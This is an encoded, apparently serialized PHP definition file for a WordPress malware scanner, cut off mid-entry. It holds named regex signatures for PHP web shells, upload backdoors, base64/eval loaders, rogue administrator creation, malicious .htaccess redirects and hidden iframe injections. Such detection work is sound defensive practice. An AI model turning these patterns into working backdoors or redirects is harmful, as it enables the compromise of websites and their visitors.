lx9XStcfVxzKihcPz5ccyo8XD9bcGhcc1=qKT8pKmlmW1xzXChdK2lzc2V=XChcJF8oUkVRVUVTfEdFfFBPUylUW15cKV=rW1wpXHNce1=rKChlY2hvfHByaW5=fFwkW2EtelxfMC=5XStccyo9KVteO1=rO1xzKikraWZbXHNcKF=rXCRfKFJFUVVFU3xHRXxQT1MpVFteXCldK1tcKVxzXHtdK2lmW1xzXChdK1xAP2NvcHlcKChbXHNcLF=qXCRfRklMRVMoXFtbXlxdXStcXSkrKStbXClcc1=rXHtbXlx9XSsoW1x9XHNdKyhlbHNlW1xzXHtdK1teXH1dKyk_KSsoXD8-XHMqKDwodGl=bGU-aGFja2VkLmJ5W15cbl=qfFwvW2Etel=rPilccyopKnwkKS9pcyI7fXM6NTE6ImlmIGlzc2V=IEZJTEVTfFJFUVVFU1QgbW92ZV91cGxvYWRlZF9maWxlIGVsc2UgZWNobyI7YToyOntpOjA7czo1OiJGMlJCbCI7aToxO3M6NTA5OiIvPFw_W3BoXHNdKygoXCRbYS16XF8wLTldK1xzKj18c2V=X3RpbWVfbGltaXRcKHxpbmlfc2V=XCgpW147XStbO1xzXSspKigoW2EtelxfMC=5XSspXChbXjtdK1s7XHNcfV=rKT8oaWZbXChcc1=rc3Vic3RyW1woXHNdK1teXHtdK1tcc1x7XSsoXCRbYS16XF8wLTldK1xzKj1bXjtdK1s7XHNcfV=rKSspPyhpZltcKFxzXSsoaXNzZXRbXChcc1=rKT9cJF8oRklMRVN8UkVRVUVTVHxQT1NUfEdFVClbXlwpXSpbXClcc1x7XSsoXCRbYS16XzAtOV=rXHMqPVteO1=rO1xzKikqKSsoXEB8aWZbXChcc1=rKSptb3ZlX3VwbG9hZGVkX2ZpbGVcKFteO1=rKFs7XHNcfV=rKGVsc2VbXHtcc1=rfChlY2hvfGV4aXQpW147XSpbO1xzXH1dKykqKSsoZnVuY3Rpb25ccytcNFwoW147XStbO1xzXH1dKyhcJFthLXpcXzAtOV=rXHMqPVteO1=rWztcc1x9XSspKmlmW1woXHNdK1teXHtdK1tcc1x7XSsoXEB8aWZbXChcc1=rKSpta2RpclwoW147XStbO1xzXH1dK3JldHVyblteO1=rWztcc1x9XSspPyhcPz58JCkvaSI7fXM6NTM6ImV4ZWMgc3lzdGVtIHBhc3N=aHJ1IGZ3cml=ZSBWYXJpYWJsZSBGdW5jdGlvbiBSRVFVRVNUIjthOjI6e2k6MDtzOjU6IkY3UE1SIjtpOjE7czoyMTY6Ii88XD9bcGhcc1=rKChcJFthLXpfMC=5XSspXHMqPVxzKihbYS16XzAtOV=rXChccyopXCRfKFJFUVVFU3xHRXxQT1MpVFxbLioocGFzc3RocnV8ZXhlY3xzeXN=ZW18XCRbYS16XzAtOV=rKVwoW1xzIl=qXDJ8Lis_ZXhlY1woLis_c3lzdGVtXCguKz9wYXNzdGhydVwoLis_ZndyaXRlXCguKz9cQD9cJFthLXpfMC=5XStcKFwkXyhSRVFVRVN8R=V8UE9TKVQpLis_KCR8XD8-KS9pcyI7fXM6NTU6InBocCBWYXJzIEFycmF5IGJhc2U2NF9kZWNvZGUgZnVuY3Rpb24gVmFyaWFibGUgRnVuY3Rpb24iO2E6Mjp7aTowO3M6NToiRzVENlMiO2k6MTtzOjI3NToiLyhcJFthLXpfMC=5XStccyo9W147XStbO1xzXSspKihcJFtcJFx7XSpbYS16XzAtOV=rXH=qKFxzKlxbW15cXV=rXF18XHMqXHtbXlx9XStcfSkqKVxzKj1ccyphcnJheVtcKFxzXStiYXNlNjRfZGVjb2RlXCguKz9mdW5jdGlvbiAoW2Etel8wLTldKylccypcKC4rP1wyXHMqKFxbW15cXV=rXF1ccyopKlwoLisoXCRbXCRce1=qW2Etel8wLTldK1x9KihccypcW1teXF1dK1xdfFxzKlx7W15cfV=rXH=pKilccyo9XDRcKC4rPyhlY2hvfGRpZXxwcmludClbXHNcKF=qXDZbXjtdKjsvaXMiO31zOjM2OiJpZiByZW5hbWUgb3IgZmlsZV9wdXRfY29udGVudHMgdG91Y2giO2E6Mjp7aTowO3M6NToiRjJORTYiO2k6MTtzOjkxOiIvPFw_Lis_Y29weVwoX19GSUxFX18sLis_ZmlsZV9wdXRfY29udGVudHNcKC4rP3VubGlua1woLis_aGVhZGVyXCgiTG9jYXRpb246IGh=dHA6XC9cLy4rL2lzIjt9czozMzoiaHRtbCBoZWFkIHVuemlwIEZJTEVTIHVubGluayBmb3JtIjthOjI6e2k6MDtzOjU6IkcyUUNCIjtpOjE7czoyMzA6Ii9ePGh=bWw-XHMqPGhlYWQ-Lis_KGZpbGVwZXJtc1xzKlwoLis_KHBvc2l4X2dldFtwd3Vncl=raWRccypcKC4rPyl7Mix9bW92ZV91cGxvYWRlZF9maWxlXHMqXCguKz9mcHV=c1xzKlwoLis_dW5saW5rXHMqXCguKz9leGVjXHMqXCguKz9ccypyZWFkZGlyXCguKz9cP3x1bnppcFwoXCRfRklMRVNcWy4rP3VubGlua1woXCQuK1w_PlxzKjxcL2Zvcm=pPlxzKjxcL2JvZHk-XHMqPFwvaHRtbD5ccyokL2lzIjt9czo4OToiY3VybF9pbml=IGhlYWRlciBMb2NhdGlvbiByZXR1cm4gcHJlZ19yZXBsYWNlX2NhbGxiYWNrIGNyZWF=ZV9mdW5jdGlvbiByZXR1cm4gUkVNT1RFX=FERFIiO2E6Mjp7aTowO3M6NToiRUNUMmUiO2k6MTtzOjE=NjoiLzxcPy4rP2N1cmxfaW5pdFwoLis_aGVhZGVyW1woIidcc1=rTG9jYXRpb246Lis_cmV=dXJuIHByZWdfcmVwbGFjZV9jYWxsYmFja1woLis_Y3JlYXRlX2Z1bmN=aW9uXCguKz9yZXR1cm4gXCRfU=VSVkVSXFtbIiddUkVNT1RFX=FERFIuKyhcPz58JCkvaXMiO31zOjgxOiJwaHAgYmFzZTY=X2RlY29kZSBmaWxlX3B1dF9jb25=ZW5=cyB1bmxpbmsgZnVuY3Rpb25fZXhpc3RzIEhleCBjYWxsX3VzZXJfZnVuYyBIZXgiO2E6Mjp7aTowO3M6NToiRjE2MHEiO2k6MTtzOjM1NjoiLzxcP1twaFxzXSsoXCRce1teXH1dK1tcfVxzXSsoXFtbXlxdXStbXF1cc1x9XSspKj1bXjtdK1s7XHNdKyhcQD8oXCRbYS16XzAtOV=rXHMqPXxkZWZpbmVcKHxzZXNzaW9uX3N=YXJ=XCh8ZXJyb3JfcmVwb3J=aW5nXCh8aW5pX3NldFwofHNldF9=aW1lX2xpbWl=XCh8c2V=X21hZ2ljX3F1b3Rlc19ydW5=aW1lXCgpW147XStbO1xzXSt8aWZcKFteXHtdK1tce1xzXStbXlx9XStbXH1cc1=rKSopKyhbXjtdK1s7XHNdKyk_LitmaWxlX3B1dF9jb25=ZW5=c1woLis_YmFzZTY=X2RlY29kZVwoLis_dW5saW5rXCguKz9mdW5jdGlvbl9leGlzdHNcKFsnIl1cXHguKz9jYWxsX3VzZXJfZnVuY1woWyciXVxceC4rPygkfFw_PikvaXMiO31zOjUzOiJwaHAgZnVuY3Rpb24gZmlsZV9nZXRfY29udGVudHMgZndyaXRlIHVubGluayBfX=ZJTEVfXyI7YToyOntpOjA7czo1OiJHNDZLSyI7aToxO3M6MTU=OiIvPFw_W3BoXHNdKyhcJFthLXpfMC=5XStccyo9W147XSs7XHMqKSpmdW5jdGlvbiAoW2Etel8wLTldKylcKC4rZmlsZV9nZXRfY29udGVudHNcKC4rZm9wZW5cKC4rZndyaXRlXCguK2ZjbG9zZVwoLitcMlwoLit1bmxpbmtcKF9fRklMRV9fXCk7XHMqKCR8XD8-XHMqKS9pIjt9czo1NToiaHRtbCBib2R5IHBocCBvcGVuZGlyIHJlYWRkaXIgIWZpbGVfZXhpc3RzIGZvcGVuIGZ3cml=ZSI7YToyOntpOjA7czo1OiJGMkRKViI7aToxO3M6MjIxOiIvKDwoXCF8XC8pPyhkb2N=eXBlfGh=bWx8aGVhZHxtZXRhfHRpdGxlfGJvZHkpW14-XSo-W2Etel8wLTlcc1=qKXsyLH=8XD9bcGhcc1=rXCRbYS16XF8wLTldK1xzKj1ccyonPFw_W3BoXHNdKy4rP29wZW5kaXJcKC4rP3JlYWRkaXJcKC4rPyhcIWZpbGVfZXhpc3RzXCguKz9mb3BlblwoLis_ZndyaXRlXCguKz8pezMsfVw_PlxzKig8XC8oaHRtbHxib2R5KVtePl=qPlxzKil7Mix9JC9pcyI7fXM6Njg6InBocCBmdW5jdGlvbiBkaWUgc2V=Y29va2llIGlmIGVtcHR5IGlmIGlzc2V=IGZvcm=gbW92ZV91cGxvYWRlZF9maWxlIjthOjI6e2k6MDtzOjU6Ikc5Mkp3IjtpOjE7czo2MDE6Ii88XD9bcGhcc1=rKChcJFthLXpfMC=5XSspXHMqPVteO1=rO1xzKikqKGlmW1woXHNdKyhcMnxcIWVtcHR5W1woXHNdKylbXlx7XStce1xzKigoKChcJFthLXpfMC=5XSspXHMqPVxzKik_KFwyXCguKj9cKSt8XCRfKFJFUVVFU3xHRXxQT1MpVFteO1=rKTtccyp8aWZbXChcc1whXSsoaXNzZXRbXChcc1=rLis_XCkrXHMrW2Etel8wLTldK3xcOFteXH1dKikpKStbXH1cc1=qfGZ1bmN=aW9uIFthLXpfMC=5XStcKFteXHtdK1x7XHMqKGRpZVwoLis_XCk7XHMqfChcJF9DT=9LSUUuKz87XHMqfHNldGNvb2tpZVwoLis_XCk7XHMqKXsyfSlcfVxzKikrKFtcc1x7XSooXCRbYS16XzAtOV=rKVxzKj1ccypcJF8oUkVRVUVTVHxHRVR8UE9TVHxGSUxFKVteO1=rO1tcc1x9XSopKihcPz5ccyp8ZWNob1tcc1woXSooWyciXSkpKDwoZm9ybXxpbnB1dClbXj5dKj5bYS16XDowLTlcc1=qKSs8XC9mb3JtPihccyo8XD9bcGhcc1=rfFsnIl=7XHMqKShcJFthLXpfMC=5XStccyo9W147XSs7XHMqfGlmW1xzXChdKykqKG1vdmVfdXBsb2FkZWRfZmlsZVwoW15cO1=rfChcJFthLXpfMC=5XSspXHMqPVxzKlwkW2Etel8wLTldK1xzKlwoLio_XCkpO1tcc1x9XSooJHxcPz4pL2kiO31zOjEyOToicGhwIHNldF9=aW1lX2xpbWl=IGluaV9zZXQgZXJyb3JfcmVwb3J=aW5nIGlmIGFycmF5X2tleV9leGlzdHMgSFRUUF9VU=VSX=FHRU5UIHNlYXJjaC1=cmFja2VyLmNvbSBwcmVnX21hdGNoIGdvb2dsZSBiaW5nIG9iX3N=YXJ=IjthOjI6e2k6MDtzOjU6IkYzSktoIjtpOjE7czoyMzA6Ii88XD9bcGhcc1=rLio_c2V=X3RpbWVfbGltaXRcKC4rP2luaV9zZXRcKC4rP2Vycm9yX3JlcG9ydGluZ1woLis_aWZbXChcIVxzXSthcnJheV9rZXlfZXhpc3RzXChbIiddSFRUUF9VU=VSX=FHRU5ULis_aHR=cDpcL1wvc2VhcmNoLXRyYWNrZXJcLmNvbVwvaW5cLmNnaVw_Lis_KHByZWdfbWF=Y2hcKFsiJ11cLyhbXlwvXSpnb29nbGV8W15cL1=qYmluZyl7Mn=uKz8pezJ9Lis_b2Jfc3RhcnRcKC4rL2lzIjt9czo3MjoiYmFzZTY=X2RlY29kZSBmaWxlX3B1dF9jb25=ZW5=cyBjaG1vZCB=b3VjaCBmc29ja29wZW4gY3VybF9leGVjIG9iX3N=YXJ=IjthOjI6e2k6MDtzOjU6IkZCR=JZIjtpOjE7czoxOTU6Ii9cL1wvXHMqaXN=YXJ=Lis_KFwkW2Etel8wLTldKylbXHMqXC49XStiYXNlNjRfZGVjb2RlXCguKz9maWxlX3B1dF9jb25=ZW5=c1woW14sXSssXHMqXDEuKz9jaG1vZFwoLis_dG91Y2hcKC4rPyhmc29ja29wZW5cKC4rP2ZnZXRzXCh8Y3VybF9pbml=XCguKz9jdXJsX2V4ZWNcKCkuKz9vYl9zdGFydFwoLis_XC9cL2llbmRbXlxuXD9dKi9pcyI7fXM6MTA1OiJwaHAgZXJyb3JfcmVwb3J=aW5nIGluaV9zZXQgc2V=X3RpbWVfbGltaXQgaWYgaXNzZXQgUkVRVUVTVCBmaWxlX2dldF9jb25=ZW5=cyBmaWxlX3B1dF9jb25=ZW5=cyB1bmxpbmsgaWUiO2E6Mjp7aTowO3M6NToiRkIyRlUiO2k6MTtzOjM4NjoiLzxcP1twaFxzXSsoXC9cKlteXCpdKihcKlteXCpcL1=qKStcL1xzKnxcL1wvW15cbl=qXHMrKSooaWdub3JlX3VzZXJfYWJvcnRccypcKFteO1=qWztcc1=rfFwkW2EtelxfMC=5XStccyo9W147XSpbO1xzXSspKygoZWxzZVtcc1x7XSp8aWZbXHNcKF=rW147XSt8XCRbYS16XF8wLTldK1xzKj1ccyopKihlcnJvcl9yZXBvcnRpbmd8aW5pX3NldHxzZXRfdGltZV9saW1pdClccypcKFteO1=rWztcfVxzXSspKyhpZltcc1woXStpc3NldFtcc1woXStcJF8oUkVRVUVTfEdFfFBPUylUW147XSsoZmlsZV9nZXRfY29udGVudHN8ZmlsZV9wdXRfY29udGVudHN8dW5saW5rKVxzKlwoW147XSsoO1xzKihkaWV8cHJpbnR8ZWNobylbXjtdKikqWztcfVxzXSspezMsfS4qPygkfFw_PikvaXMiO31zOjY2OiJwaHAgaWYgZnVuY3Rpb25fZXhpc3RzIGZpbGVfcHV=X2NvbnRlbnRzIGZvcGVuIGNobW9kIHN5c3RlbSB1bmxpbmsiO2E6Mjp7aTowO3M6NToiRkJOS=8iO2k6MTtzOjE2OToiLzxcPyguKz8odG91Y2h8aGVhZGVyKVwoKSsuKz9pZltcc1woXCFdK2Z1bmN=aW9uX2V4aXN=c1woW1xzJyJdKyhmaWxlX3B1dF9jb25=ZW5=cylbIidcc1wpXHtdK2Z1bmN=aW9uXHMrXDNcKC4rP2ZvcGVuXCguKz9cM1woLis_Y2htb2RcKC4rP3N5c3RlbVwoLisodW5saW5rfGV4aXQpXCguKy9pcyI7fXM6MjY6InBocCBlY2hvIHBhc3N=aHJ1IF9SRVFVRVNUIjthOjI6e2k6MDtzOjU6IkZCTktCIjtpOjE7czoxNTY6Ii88XD9bcGhcc1=rKChlY2hvfHByaW5=KVtcc1woXSsoWyciXSkuKj9cM1tcKVxzXSo7XHMqKSooKFwkW2Etel8wLTldKylccyo9XHMqKT9cQD8ocGFzc3RocnV8ZXhlY3xzeXN=ZW18XCRbYS16XzAtOV=rKVxzKlwoXCRfKFJFUVVFU3xHRXxQT1MpVC4rO1xzKigkfFw_PikvaSI7fXM6Njk6InJlcXVpcmVfb25jZSB3cC1jb25maWcgaW5pX3NldCBteXNxbF9xdWVyeSBVUERBVEUgdXNlcnMgU=VUIHVzZXJfcGFzcyI7YToyOntpOjA7czo1OiJGQ1ZLcCI7aToxO3M6MTkxOiIvXi4qPFw_W3BoXHNdKihpbmNsdWRlfHJlcXVpcmUpKF9vbmNlKT9cKC4rd3AtY29uZmlnXC5waHBbIidcc1wpO1=rKFxAP2luaV9zZXRcKFteXCldK1tcKTtcc1=rKSsuKz8obXlzcWxfcXVlcnlcKFsnIl1VUERBVEVbXHNceyciLl=rXCR=YWJsZV9wcmVmaXhbXHNcfSciLl=rdXNlcnNccytTRVRccyt1c2VyX3Bhc3MuKyl7Mix9JC9pcyI7fXM6MTEwOiJwaHAgaWYgUkVRVUVTVCBhZGRfYWN=aW9uIGZ1bmN=aW9uIGdsb2JhbCBpZiBnZXRfb3B=aW9uIHJldHVybiBvYl9zdGFydCB3cF9yZXdyaXRlLT5mbHVzaF9ydWxlcyB3cF9jYWNoZV9mbHVzaCI7YToyOntpOjA7czo1OiJIMTlEQiI7aToxO3M6NTQ5OiIvPFw_W3BoXHNdKyg_OmlmXHMqXChbXlwpXSpcJF8oUE9TfFJFUVVFU3xHRSlUW15ce1=rW1x7XHNdKygpfGFkZF9hY3Rpb25ccypcKFteLF=rLFxzKihbJyJdKShbYS16XzAtOV=rKVsnIlwpO1xzXH1dKygpfGZ1bmN=aW9uXHMrXDRbXlx7XStbXHtcc1=rKCkpezN9XDJcNVw2KCgoaW5jbHVkZXxyZXF1aXJlKShfb25jZSk_XChbXjtdKztccyp8aWZbXHNcKFwhXSt1c2VybmFtZV9leGlzdHNcKFteXHtdK1tce1xzXSspKihcJFthLXpfMC=5XSspXHMqPVxzKndwX2NyZWF=ZV91c2VyXChbXjtdKztccyooXCRbYS16XzAtOV=rKVxzKj1ccypuZXdccytXUF9Vc2VyW1woXHNdK1wxMVtcKTtcc1=rXDEyW1xzXC=-XStzZXRfcm9sZVtcKFxzJyJdK2FkbWluaXN=cmF=b3J8KGdsb2JhbFteO1=qO1xzKik_aWZbXHNcKFwhXStnZXRfb3B=aW9uXChbXlwpXStbXClcc1x7XStyZXR1cm5bXjtdKjtbXHNcfV=rb2Jfc3RhcnRcKFwpO1xzKlw_Pi4rXCR3cF9yZXdyaXRlLT5mbHVzaF9ydWxlc1woXCk7XHMqd3BfY2FjaGVfZmx1c2hcKClbIidcc1wpO1xzXH1dKygkfFw_PikvaXMiO319czo4OiJodGFjY2VzcyI7YToxNDp7czoyODoiZXhjZXNpdmUgc3BhY2VzIGluIC5odGFjY2VzcyI7YToyOntpOjA7czo1OiJFQTg3cCI7aToxO3M6MzE6Ii9bXHJcbl=rKFtcdCBdezMwfXxbXHRdezEwfSkuKi8iO31zOjI2OiJleGNlc2l2ZSB=YWJzIGluIC5odGFjY2VzcyI7YToyOntpOjA7czo1OiJFQTg4UyI7aToxO3M6MzI6Ii9eKFtcdCBdezMwfXxbXHRdezEwfSkuKltcclxuXSsvIjt9czoyMjoiUmV3cml=ZVJ1bGUgbW9iaWxlIDMwMiI7YToyOntpOjA7czo1OiJENDVFOSI7aToxO3M6MTM4OiIvUmV3cml=ZUVuZ2luZSBvbi4rP1Jld3JpdGVSdWxlIFxeW1woXT9cLlwqW1wpXT9cJCBodHRwOlwvXC8obW9iaWxlLS4rP3wuKz9jb3VudChlcik_XC5waHB8Lis_XD9oPVswLTldKykgXFsoTFwsKT9SKD1bMC=5XXszfSk_KFwsTCk_XF=vc2kiO31zOjI2OiJwaHBfdmFsdWUgYXV=b19hcHBlbmRfZmlsZSI7YToyOntpOjA7czo1OiJEM=M2RiI7aToxO3M6MzE6Ii9waHBfdmFsdWUgYXV=b19hcHBlbmRfZmlsZSAuKy8iO31zOjQ3OiJUYWdlZCBSZXdyaXRlQ29uZCBIVFRQX1JFRkVSRVIgUmV3cml=ZVJ1bGUgSFRUUCI7YToyOntpOjA7czo1OiJEM=o2dyI7aToxO3M6MTY3OiIvXCNbYS16QS1aMC=5XStcIy4rP1Jld3JpdGVFbmdpbmUgb25bXHJcbiBcdF=rUmV3cml=ZUNvbmQgXCVce=hUVFBfUkVGRVJFUlx9Lis_UmV3cml=ZVJ1bGUgXF5cKFwuXCpcKVwkIGh=dHA6XC9cLy4rPyBcWyhMXCwpP1I9WzAtOV17M3=oXCxMKT9cXS4rP1wjXC9bYS16QS1aMC=5XStcIy9zaSI7fXM6Mjc6IkVycm9yRG9jdW1lbnQgNDA=IHdwcHBtLnBocCI7YToyOntpOjA7czo1OiJEQkk2MCI7aToxO3M6MzI6Ii9FcnJvckRvY3VtZW5=IDQwNCAuK3dwcHBtXC5waHAvIjt9czo1NToiUmV3cml=ZUNvbmQgVVNFUl9BR=VOVCBSRUZFUkVSIFJld3JpdGVSdWxlIHN=YXJ=aW5nLnBocCI7YToyOntpOjA7czo1OiJFOEg5diI7aToxO3M6OTE6Ii8oUmV3cml=ZUNvbmQgXCVce=hUVFBfKFVTRVJfQUdFTlR8UkVGRVJFUilcfS4rW1xyXG5dKykrUmV3cml=ZVJ1bGUuKz9cL3N=YXJ=aW5nXC5waHBcPy4rL2kiO31zOjQ4OiJSZXdyaXRlQ29uZCBIVFRQX1VTRVJfQUdFTlQgUmV3cml=ZVJ1bGUgaHR=cCAucnUiO2E6Mjp7aTowO3M6NToiRjNSQlciO2k6MTtzOjEwNzoiLyhSZXdyaXRlRW5naW5lIG9uXHMrKT8oUmV3cml=ZUNvbmQgLio_SFRUUChcOnxfQUNDRVBUfF9VU=VSX=FHRU5UKS4qXHMrKStSZXdyaXRlUnVsZS4qPyBodHRwLis_XC5ydS4qXHMqL2kiO31zOjQ5OiJSZXdyaXRlQ29uZCBIVFRQX1VTRVJfQUdFTlQgUmV3cml=ZVJ1bGUgaHR=cCAucGhwIjthOjI6e2k6MDtzOjU6IkYyTzgwIjtpOjE7czo5NzoiLyhSZXdyaXRlQ29uZCBcJVx7SFRUUF9VU=VSX=FHRU5UXH=gLitccyspK1Jld3JpdGVSdWxlIFxeXCQgaHR=cDpcL1wvLis_KG1vYnkyNFwuY29tfFwucGhwXD8pLisvaSI7fXM6Nzk6IlJld3JpdGVFbmdpbmUgT24gUmV3cml=ZUJhc2UgUmV3cml=ZUNvbmQgUmV3cml=ZVJ1bGUgaW5kZXgucGhwIHBhc3NpbmcgdmFyaWFibGUiO2E6Mjp7aTowO3M6NToiRUNFOFMiO2k6MTtzOjE3NzoiL1Jld3JpdGVFbmdpbmUgT25ccytSZXdyaXRlQmFzZSBcLyhbYS16MC=5XF9cLV=rKVwvXHMrUmV3cml=ZVJ1bGUgXF5pbmRleFteXF1dK1xdXHMrKFJld3JpdGVDb25kIC4rXHMrKStSZXdyaXRlUnVsZSBcXlwoXC5cKlwpXCQgXC9cMVwvaW5kZXhcLnBocFw_W2EtejAtOVxfXC1dKz1cJDEgXFtbXlxdXStcXS9pIjt9czo2NDoiUmV3cml=ZUVuZ2luZSBvbiBSZXdyaXRlQ29uZCBIVFRQX1VTRVJfQUdFTlQgUmV3cml=ZVJ1bGUgaHR=cCBJUCI7YToyOntpOjA7czo1OiJHOUpBWSI7aToxO3M6MTkzOiIvKFJld3JpdGVFbmdpbmUgb25ccyspPyhSZXdyaXRlQ29uZCBcJVx7KFJFUVVFU1RfVVJJfEhUVFBfUkVGRVJFUnxIVFRQX1VTRVJfQUdFTlQpXH=oPyEgZmF2aWNvblwuaWNvIFxbKS4rXHMrKStSZXdyaXRlUnVsZSAuKiBodHRwOlwvXC8oPyExMjdcLnxcJVx7KEhUVFBfSE9TVHxSRU1PVEVfQUREUilcfXx3aWtpcGVkaWFcLm9yZykuKi9pIjt9czo=MjoiUmV3cml=ZUVuZ2luZSBvbiBVTkNPTkRJVElPTkFMIFJld3JpdGVSdWxlIjthOjI6e2k6MDtzOjU6IkgyMUwyIjtpOjE7czo3NToiL1Jld3JpdGVSdWxlIFxeW15cc1=rXHMrLis_KD88IShpbmRleFxcfG1pbmlmeSlcLnBocFw_W149XSs9W1wkXCVce1xcXSsuKy9pIjt9czoxMDk6IlJld3JpdGVDb25kIEVOVjpSRURJUkVDVF9TVEFUVVMgUmV3cml=ZVJ1bGUgUmV3cml=ZUNvbmQgUkVGRVJFUi9VU=VSX=FHRU5UIGdvb2dsZS95YWhvby9iaW5nIFJld3JpdGVSdWxlIC5waHAiO2E6Mjp7aTowO3M6NToiRzE=Qk=iO2k6MTtzOjI2MzoiL1Jld3JpdGVDb25kXHMrXCVce=VOVlw6UkVESVJFQ1RfU1RBVFVTXH1ccysyMDBccytSZXdyaXRlUnVsZVtcXlwtXHNdK1xbW15cXV=rXF1ccysoUmV3cml=ZUNvbmRccytcJVx7SFRUUF8oUkVGRVJFUnxVU=VSX=FHRU5UKVx9XHMrXCgoKGdvb2dsZXx5YWhvb3xtc258YW9sfGJpbmcpKFx8fFwpKSkrKFxzK1xbW15cXV=rXF=pKlxzKykrUmV3cml=ZVJ1bGVccytcXlwoW15cKV=rXClcJFxzK1thLXpfXC=wLTldK1wucGhwXD9cJDFccytbXlxdXStbXF1cc1=rL2kiO31zOjIxOiJEaXJlY3RvcnlJbmRleCAhaW5kZXgiO2E6Mjp7aTowO3M6NToiRzU=RDciO2k6MTtzOjczOiIvKD88PURpcmVjdG9yeUluZGV4ICkoPyFpbmRleC5odG1sIHxpbmRleC5odG=gKSguKz8pKD89W15cL11pbmRleFwucGhwKS9pIjt9fXM6NToia25vd24iO2E6MTQ3OntzOjMzOiJDT=9LSUUgcHJlZ19tYXRjaCBmdW5jdGlvbl9leGlzdHMiO2E6Mjp7aTowO3M6NToiSDFDRHAiO2k6MTtzOjMwNToiLyg8XD9bcGhcc1=rZnVuY3Rpb25ccysoW2Etel8wLTldKylbXHNcKF=rKFwkW2Etel8wLTldKylbXHNcKVx7XSsoXCRbYS16XzAtOV=rKVxzKj1ccyppbXBsb2RlXChbXjtdKztccyouKz8pP2lmW1xzXChdK2lzc2V=W1xzXChdK1wkX=NPT=tJRVxbLis_KGlmW1xzXChcQF=rcHJlZ19tYXRjaFwoLis_aWZcW1xzXChcQF=rcHJlZ19tYXRjaFwoLis_aWZbXHNcKFxAXStmdW5jdGlvbl9leGlzdHNcKC4rPyhccytcfSl7M318KGVjaG98cHJpbnR8ZGllKVtcc1woXStcMltcc1woXSthcnJheVtcc1woMC=5LFwpXSs7XHMqKCR8XD8-KSkvaXMiO31zOjMxOiJzY3JpcHQgZ29vZ2xlYmxvZ2NvbnRhaW5lciBldmFsIjthOjI6e2k6MDtzOjU6IkdCUjhNIjtpOjE7czoxMjY6Ii88c2NyaXB=W14-XSsoc3JjPVsnImh=cHM6XStcL1wvZ29cLlteXD9dK1w_KHpvbmV8aWR8cCkrPVxkK1snIlwmXVtePl=qPnxpZD=iZ29vZ2xlYmxvZ2NvbnRhaW5lciIuK2V2YWxcKC4rKVxzKjxcL3NjcmlwdD5ccyovaSI7fXM6MjI6ImluY2x1ZGUgcGhwNS5waHAgYWxvbmUiO2E6Mjp7aTowO3M6NToiRjVMQlYiO2k6MTtzOjEwMjoiLzxcP1twaFxzXStpZlxzKlwoaXNbXlwpXStbXClcc1x7XStcQD9pbmNsdWRlXCgoLis_XC5pY298J3BocDVcLnBocClbIiddXCk7KFxzKmRpZVteO1=qOyk_W1xzXH1dKlw_Pi9pIjt9czoyNzoiZG9jdW1lbnQud3JpdGUgaWZyYW1lIHNtYWxsIjthOjI6e2k6MDtzOjU6IkUyR=NIIjtpOjE7czoxNjM6Ii8oZG9jdW1lbnRcLndyaXRlXChbJyJdKT88aWZyYW1lIHNyYz1bJyJdaHR=cDpcL1wvKC4rPykoIChoZWlnaHR8d2lkdGgpPVsnIl=_WzAtNV1bJyJdPykrKCBzdHlsZT1bJyJddmlzaWJpbGl=eTpbXHQgXSpoaWRkZW5bXj5dKj48XC9pZnJhbWU-fD48XC9pZnJhbWU-WyciXVwpKTsqL2kiO31zOjI3OiJkb2N1bWVudC53cml=ZSBpZnJhbWUgLnBocDUiO2E6Mjp7aTowO3M6NToiRDFFSnYiO2k6MTtzOjY1OiIvZG9jdW1lbnRcLndyaXRlXChbJyJdPGlmcmFtZSAuK2xlZnRcOlsgXT8tLis8XC9pZnJhbWU-WyciXVwpOyovaSI7fXM6MTA6ImFycmF5IGV2YWwiO2E6Mjp7aTowO3M6NToiRzM2SUMiO2k6MTtzOjIzMToiLyhmdW5jdGlvblxzKyhbYS16XzAtOV=rKVwoKFteO1=qWztcc1x9XSspKz9yZXR1cm5bXjtdKls7XHNcfV=rKT8oKFwkW1wtXD5cLmEtel8wLTldKylccyo9XHMqKCgoWyciXSkuKlw4W1wuXHNdKikrfGFycmF5KF9tYXApKlxzKlwoW15cKV=qW1wpXHNdKygsW15cKV=qW1wpXHNdKykqKTtccyopK2V2YWxccyooXC9cKlteXCpdKihcKlteXCpcL1=qKStcL1xzKikqXCguKj8oXDJ8XDUpLipbXClcc1=rOy9pIjt9czoyNToiZG9jdW1lbnQud3JpdGUgaWZyYW1lIC5ydSI7YToyOntpOjA7czo1OiJFOUpJYyI7aToxO3M6NzE6Ii8oZG9jdW1lbnRcLndyaXRlXCh8ZWNobyApWyciXTxpZnJhbWUgLitcLnJ1XC8uKzxcL2lmcmFtZT5bJyJdWyBcKTtdKy9pIjt9czo4OiJldmFsIGhleCI7YToyOntpOjA7czo1OiJHODlGMCI7aToxO3M6Nzg6Ii9cQD9ldmFsXHMqXChbYS16XzAtOVxzXChdKihbIiddKVteO1=qKFxcKHhbMC=5YS1mXXsyfXxcZCspKStbXjtdKlwxW1wpXHNdKjsvaSI7fXM6MTk6ImZ1bmN=aW9uX2V4aXN=cyBlbW8iO2E6Mjp7aTowO3M6NToiRzJTOTEiO2k6MTtzOjc1OiIvPFw_W3BoXHNdKihpZiBcKFwhZnVuY3Rpb25fZXhpc3RzXCgnZW1vJ1wpLitleGl=O1x9fHdwX2Zvb3RzXChcKTspXHMqXD8-L2kiO31zOjM=OiJmdW5jdGlvbl9leGlzdHMgYmFzZTY=X2RlY29kZSBldmFsIjthOjI6e2k6MDtzOjU6IkY=N=tXIjtpOjE7czoxNTA6Ii9pZlxzKlwoXHMqXCFmdW5jdGlvbl9leGlzdHNccypcKC4rW1wpXHNdK1tce1xzXSpmdW5jdGlvblxzKlthLXpcXzAtOV=rXCguK1tcKVxzXStbXHtcc1wkYS16XF8wLTlcfVxzXD1cQF=qYmFzZTY=X2RlY29kZVxzKlwoLitldmFsXHMqXCguK1tcKTtcc1x9XSsvaSI7fXM6Mjg6ImVjaG8gZ3ppbmZsYXRlIGJhc2U2NF9kZWNvZGUiO2E6Mjp7aTowO3M6NToiSDFPOTkiO2k6MTtzOjExMDoiL1wjW2Etel9cLT=wLTldK1wjW1xzXEBdK2VjaG9bXChcc1xAXStnemluZmxhdGVbXChcc1xAXStiYXNlNjRfZGVjb2RlW1woXHNdKy4rW1wpXHNdKztccypcI1wvW2Etel9cLT=wLTldK1wjL2kiO31zOjIxOiJwcmVnX3JlcGxhY2UgL2UgYWxvbmUiO2E6Mjp7aTowO3M6NToiRjZPOU=iO2k6MTtzOjIwNToiLzxcP1twaFxzXSooKFxAP2Vycm9yX3Jl